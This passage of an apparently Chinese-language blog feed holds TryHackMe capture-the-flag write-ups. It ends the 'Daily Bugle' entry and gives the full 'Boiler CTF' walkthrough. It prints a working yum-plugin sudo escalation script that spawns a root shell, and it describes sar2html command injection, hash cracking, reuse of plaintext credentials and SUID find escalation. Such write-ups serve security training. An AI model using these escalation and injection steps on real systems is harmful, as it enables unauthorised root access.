class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/x&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">plugins=1</span></span><br><span class="line"><span class="string">pluginpath=$TF</span></span><br><span class="line"><span class="string">pluginconfpath=$TF</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.py&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import yum</span></span><br><span class="line"><span class="string">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span></span><br><span class="line"><span class="string">requires_api_version=&#x27;2.1&#x27;</span></span><br><span class="line"><span class="string">def init_hook(conduit):</span></span><br><span class="line"><span class="string">  os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161921642-247827710.png" alt="image-20241008161919145"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008162019148-1120378338.png" alt="image-20241008162016902"></p><p>在<code>/root</code>目录下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Daily Bugle</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Boiler CTF</title>
    <link href="https://ya1orin.github.io/posts/39dcc2b4.html"/>
    <id>https://ya1orin.github.io/posts/39dcc2b4.html</id>
    <published>2024-10-07T07:17:47.000Z</published>
    <updated>2024-11-13T05:19:05.808Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.20.169</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.20.169 -oN reports/namp</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155138247-2005312162.png" alt="image-20241007155136615"></p><p>发现开放21，80，10000，55007端口，55007端口运行着ssh服务</p><h2 id="21端口">21端口</h2><p>根据nmap的结果发现ftp可以匿名登录</p><p><code>ftp anonymous@10.10.20.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153623844-1063595684.png" alt="image-20241007153622117"></p><p>发现隐藏文件<code>.info.txt</code>，<code>get</code>下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153723166-2130415327.png" alt="image-20241007153721753"></p><p>内容像是被<code>rot13</code>加密过的，尝试解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007154329949-234648714.png" alt="image-20241007154328354"></p><p>解密后发现是一个提示性的文字，告诉我们需要枚举</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155409570-1133252866.png" alt="image-20241007155407443"></p><p>默认页面是一个<code>apache</code>的初始页面</p><p>先扫描一下目录</p><p><code>gobuster dir -u http://10.10.20.169/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007160930195-2042932885.png" alt="image-20241007160928359"></p><p>发现很多有意思的目录，查看一下</p><h3 id="robots-txt">robots.txt</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007161042789-96937162.png" alt="image-20241007161041169"></p><p>给的目录并没有内容返回都是404，重点看下面的一串数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162017100-1297401618.png" alt="image-20241007162015403"></p><p>解密后得到另一串数据<code>99b0660cd95adea327c54182baa51584</code></p><p>看起来像md5数据，使用<code>hashcat</code>解密</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162349391-1423906262.png" alt="image-20241007162347491"></p><p>解出来的数据是<code>kidding</code>，现在看来没什么用</p><h3 id="manual">manual</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162655725-2004416225.png" alt="image-20241007162653988"></p><p>是一个<code>apache</code>的文档，可以知道的是版本号是2.4</p><h3 id="joomla">joomla</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162747852-2035223215.png" alt="image-20241007162746149"></p><p>这是一个cms</p><h1>获取初始shell</h1><p>刚才知道了是<code>joomla</code>系统，继续深入扫描一下目录</p><p><code>gobuster dir -u http://10.10.20.169/joomla -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007163608399-43319589.png" alt="image-20241007163606266"></p><p>这次目录有点多</p><p>测试后发现只有几个有内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007164556241-928049236.png" alt="image-20241007164554560"></p><p>最重要的是这个，在<code>/joomla/_test</code>目录下发现有<a href="https://www.onworks.net/zh-CN/software/app-sar2html">sar2html</a></p><p>使用<code>searchsploit</code>搜索一下相关漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165329033-1102727197.png" alt="image-20241007165327179"></p><p>用的是第一个，复制到当前目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165423725-2036887988.png" alt="image-20241007165422004"></p><p>查看内容后发现是在url处控制<code>plot</code>参数，通过值拼接实现RCE，利用一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170011069-1384604430.png" alt="image-20241007170009665"></p><p>命令执行成功</p><p>查看一下<code>log.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170051671-1800575054.png" alt="image-20241007170050140"></p><p>发现<code>basterd</code>用户使用密码 <code>superduperp@$$</code>通过ssh连接机器，我们之前扫描结果中ssh端口发现是55007</p><p>我们使用这个凭据尝试连接</p><p><code>ssh basterd@10.10.20.169 -p 55007</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170420582-601376213.png" alt="image-20241007170418958"></p><p>连接成功，拿到<code>basterd</code>用户的shell</p><h1>横向移动</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170547184-1714231114.png" alt="image-20241007170545779"></p><p>在<code>/home/basterd</code>目录发现<code>backup.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170641598-69828711.png" alt="image-20241007170639847"></p><p>查看后发现另一个用户<code>stoner</code>，以及密码<code>superduperp@$$no1knows</code>，直接登录<code>stoner</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171143692-1069757611.png" alt="image-20241007171142250"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171247398-1778280610.png" alt="image-20241007171245935"></p><p>在<code>/home/stoner</code>目录下找到隐藏文件<code>.secret</code>，其内容就是<code>user.txt</code></p><h1>权限提升</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171443860-578181515.png" alt="image-20241007171442288"></p><p>并没有什么可以利用的</p><p>使用<code>find</code>看看能否有提权的机会</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171623374-472604132.png" alt="image-20241007171621747"></p><p>发现有find，利用find命令提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171908473-623085440.png" alt="image-20241007171907091"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171951300-1248330287.png" alt="image-20241007171949819"></p><p>同样在<code>/root</code>目录下获取到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007172145341-43973699.png" alt="image-20241007172143822"></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Boiler CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
